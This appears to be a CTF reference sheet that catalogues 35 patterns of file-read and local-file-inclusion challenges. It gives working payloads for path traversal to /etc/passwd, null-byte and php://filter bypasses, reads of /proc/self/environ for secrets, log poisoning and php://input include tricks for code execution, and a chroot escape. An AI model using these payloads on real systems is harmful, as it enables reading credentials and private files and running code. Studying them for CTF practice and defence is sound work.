# CTF Shapes — how file-read challenges actually appear

## Shape 1 — the download endpoint

`/download?file=report.pdf` / `/get?path=x` / `/view?doc=x` — the
classic. `?file=../../../etc/passwd` first.

## Shape 2 — the template/include param

`/page?name=about` / `/index.php?p=contact` — `?p=../../etc/passwd` —
the PHP-include shape, exec-capable if `include`.

## Shape 3 — the avatar/image fetcher

`/img?src=x` / `/avatar?user=x` / `/imgproxy?url=x` — read or SSRF —
test `file:///` first.

## Shape 4 — the log-viewer

`/admin/logs?file=x` / `/debug?log=x` — `/var/log/` confined → null-
byte/traversal out → log-poisoning for RCE.

## Shape 5 — the backup/restorer

`/backup?name=x` writes; `/restore?file=x` reads — the write-read
pair, also a symlink/arbitrary-write surface.

## Shape 6 — the theme/lang picker

`?theme=dark` / `?lang=fr` — a `lang=../../etc/passwd` include — the
lang-file-include classic.

## Shape 7 — the `page=` CMS

`?page=home` → `templates/home.php` — `?page=../../etc/passwd%00` —
the `+ .php` null-byte era, still alive in CTF.

## Shape 8 — the PDF/report generator

`/export?template=x` — a `template=` read, may be include-based —
`read-to-rce.md` if include.

## Shape 9 — the file-manager panel

`/files?action=read&path=x` — a full file-manager — arbitrary read
by design, flag-guarded by the sandbox.

## Shape 10 — the unzip/extract flow

Upload zip → server extracts → `/view?f=x` — archive traversal +
LFI chain — `archive-traversal.md`.

## Shape 11 — the `include`+`php://filter` pair

`?page=php://filter/convert.base64-encode/resource=index` — the source
b64 dump — read every page's source → find the flag path.

## Shape 12 — the `/proc/self/*` hint challenge

Challenge description mentions "the app knows where it is" →
`/proc/self/environ`/`cmdline`/`cwd` first.

## Shape 13 — the Java `/WEB-INF` read

`?file=/WEB-INF/web.xml` — Java app — the `getResourceAsStream`/
`FileInputStream` read — `per-stack.md`.

## Shape 14 — the Node `path.join` traversal

`res.sendFile(path.join(__dirname, 'files', req.query.f))` —
`?f=../../etc/passwd` — the Node join-shape.

## Shape 15 — the Python `open(user_input)` read

`open(f"files/{name}")` — `name=../../etc/passwd` — the raw-open shape.

## Shape 16 — the `send_from_directory` confine

Flask `send_from_directory` — the "safe" wrapper — traversal still
testable, Windows UNC edge.

## Shape 17 — the `?f=` + `.txt` suffix

`open($f . ".txt")` — `%00` (PHP<5.3.4) or path-of-a-file-named-x.txt
— the extension-suffix era shape.

## Shape 18 — the base64-param

`?f=<base64>` — decode server-side → the path — encode `../../etc/passwd`.

## Shape 19 — the git-leak read

`/.git/` served + `?file=.git/config` — read the objects →
`git-leak`-equivalent — zlib-decode the objects offline.

## Shape 20 — the flag-in-env challenge

Hint says "env" → `/proc/self/environ`/`/proc/1/environ` — `FLAG=`
in the Docker ENV.

## Shape 21 — the source-avoids-the-flag challenge

Flag ISN'T in a file — it's `os.urandom`-generated or env-injected —
the read reveals WHERE it lives: `/proc/1/environ`, a service socket.

## Shape 22 — the read-to-deserialize

`unserialize(file_get_contents($f))` — the read feeds a deser sink —
`web-deserialization` + file-read.

## Shape 23 — the filename-is-the-flag

`/flag{...}` as an actual FILENAME — `glob://*`/`scandir`-equivalent
or `file:///`-listing reveals it.

## Shape 24 — the symlink-traversal

The app follows a symlink you can write → `?file=./uploads/mylink` →
reads where the link points — upload+read combo.

## Shape 25 — the TOCTOU-read

The app checks-then-reads — `race_probe` the check-vs-read window —
`/tmp/x` swap between check and open — `web-race-conditions` territory.

## Shape 26 — the multi-hop include

`include $theme.'/'. $page .'.php'` — control `$theme` via config +
`$page` via param — the config-write+include chain.

## Shape 27 — the `file_exists`-then-include

`if (file_exists($f)) include $f;` — the existence-check is real but
the include still execs — `php://input` passes `file_exists`? No —
`file_exists('php://input')` = true! The wrapper passes the check —
include RCE survives.

## Shape 28 — the error-oracle read

No echo — the read's RESULT leaks via error (`include x.php` where
x.php contains syntax → parse error) — the error-channel read.

## Shape 29 — the hash-oracle read

`md5_file($f)`/`sha1_file($f)`/`filesize($f)`/`filemtime($f)` returns
a HASH/SIZE — a metadata oracle, not a read — but confirms existence
+ the `md5_file` of a KNOWN file proves the read path works.

## Shape 30 — the two-request combo

`POST /upload` writes a file → `GET /view?f=x` reads it — upload+read
is the standard two-request shape — `web-file-upload` chain.

## Shape 31 — the Windows `\\?\` prefix

`\\?\C:\path` — the extended-length path — bypasses path normalization
on Windows — `windows-paths.md`.

## Shape 32 — the drive-relative Windows path

`C:..\secret` — the drive-relative traversal — Windows-only —
`windows-paths.md`.

## Shape 33 — the device-path read

`CON`, `NUL`, `COM1`, `LPT1`, `\\.\PhysicalDrive0` — device paths —
`windows-paths.md` — may hang/error (a detection oracle).

## Shape 34 — the container-mounted flag

`/flag` at ROOT of container but read confined to `/app` — mount-check
via `/proc/self/mountinfo` — find the real mount-point.

## Shape 35 — the chroot-jail read

Read confined by chroot — `/proc/self/root/` escapes the chroot —
`../../proc/self/root/` traversal-out — the chroot-break shape.
